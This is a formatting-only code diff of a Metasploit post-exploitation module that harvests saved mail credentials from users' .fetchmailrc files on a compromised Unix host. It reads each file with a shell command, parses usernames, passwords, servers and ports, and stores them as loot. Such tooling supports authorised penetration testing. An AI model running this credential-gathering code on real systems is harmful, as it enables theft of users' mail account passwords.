@@ -7,33 +7,37 @@ class MetasploitModule < Msf::Post
   include Msf::Post::File
   include Msf::Post::Unix
 
-  def initialize(info={})
-    super( update_info( info,
-      'Name'          => 'UNIX Gather .fetchmailrc Credentials',
-      'Description'   => %q{
-        Post Module to obtain credentials saved for IMAP, POP and other mail
-        retrieval protocols in fetchmail's .fetchmailrc
-      },
-      'License'       => MSF_LICENSE,
-      'Author'        => [ 'Jon Hart <jhart[at]spoofed.org>' ],
-      'Platform'      => %w{ bsd linux osx unix },
-      'SessionTypes'  => [ 'shell' ]
-    ))
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => 'UNIX Gather .fetchmailrc Credentials',
+        'Description' => %q{
+          Post Module to obtain credentials saved for IMAP, POP and other mail
+          retrieval protocols in fetchmail's .fetchmailrc
+        },
+        'License' => MSF_LICENSE,
+        'Author' => [ 'Jon Hart <jhart[at]spoofed.org>' ],
+        'Platform' => %w{bsd linux osx unix},
+        'SessionTypes' => [ 'shell' ]
+      )
+    )
   end
 
   def run
     # A table to store the found credentials.
     cred_table = Rex::Text::Table.new(
-    'Header'    => ".fetchmailrc credentials",
-    'Indent'    => 1,
-    'Columns'   =>
-    [
-      "Username",
-      "Password",
-      "Server",
-      "Protocol",
-      "Port"
-    ])
+      'Header' => ".fetchmailrc credentials",
+      'Indent' => 1,
+      'Columns' =>
+      [
+        "Username",
+        "Password",
+        "Server",
+        "Protocol",
+        "Port"
+      ]
+    )
 
     # walk through each user directory
     enum_user_directories.each do |user_dir|
@@ -42,6 +46,7 @@ class MetasploitModule < Msf::Post
         # read their .fetchmailrc if it exists
         lines = cmd_exec("test -r #{fetchmailrc_file} && cat #{fetchmailrc_file}").lines.to_a
         next if (lines.size <= 0)
+
         print_status("Parsing #{fetchmailrc_file}")
 
         # delete any comments
@@ -53,8 +58,8 @@ class MetasploitModule < Msf::Post
           # if the line we are reading doesn't signify a new configuration section...
           if ((not lines[i] =~ /^(?:defaults|poll|skip)\s+/))
             # append the current line to the previous
-            lines[i-1] << " "
-            lines[i-1] << lines[i]
+            lines[i - 1] << " "
+            lines[i - 1] << lines[i]
             # and axe the current line
             lines.delete_at(i)
           end
@@ -93,7 +98,6 @@ class MetasploitModule < Msf::Post
       end
     end
 
-
     if cred_table.rows.empty?
       print_status("No creds collected")
     else
@@ -106,7 +110,8 @@ class MetasploitModule < Msf::Post
         session,
         cred_table.to_csv,
         "fetchmailrc_credentials.txt",
-        ".fetchmailrc credentials")
+        ".fetchmailrc credentials"
+      )
 
       print_status("Credentials stored in: #{p.to_s}")
     end
